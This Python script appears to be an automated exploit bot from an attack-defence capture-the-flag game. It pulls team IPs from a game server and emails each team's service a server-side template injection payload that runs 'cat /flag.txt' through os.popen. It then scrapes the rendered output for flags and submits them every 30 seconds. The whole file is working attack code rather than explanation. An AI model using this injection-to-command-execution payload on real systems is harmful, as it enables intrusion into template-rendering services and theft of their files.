import smtplib, requests
import re, json, time
from base58 import b58decode, b58encode

myip = "10.60.0.1"
r = requests.get("http://10.60.3.1:5000/infoTeams").text
r = json.loads(r)

ips = r["teams"]
token = r["myToken"]

tmp = []
for el in ips:
    if el != myip:
        tmp.append(el)
ips = tmp

while True:
    flags = []
    for ip in ips:
        res = requests.get(f"http://{ip}:5000/")
        m = re.search("<h2> This is your email address: .*@.* </h2>", res.text)
        email = m[0].split(" ")[-2]
        s = smtplib.SMTP(f"{ip}", 8025)
        EMAIL_ADDRESS = email
        #message = """Subject: example\r\n\r\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('ls').read() }}\r\n.\r\n"""
        message = """Subject: example\r\n\r\n{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat /flag.txt').read() }}\r\n.\r\n"""
        s.ehlo()
        s.sendmail("example@example.com", EMAIL_ADDRESS, msg=message ) 
        id = b58encode(email).decode()
        res = requests.get(f"http://{ip}:5000/{id}")
        m = re.search("<p>Subject: example\n\n.*\n\.\n</p>", res.text)
        flag = m[0].split("\n")[-3]
        flags.append(flag)
    print(flags)
    json = {"flags":flags, "team_token":token}
    submission = requests.post("http://10.60.3.1:5000/submit", json=json)
    print(submission.text)
    time.sleep(30)
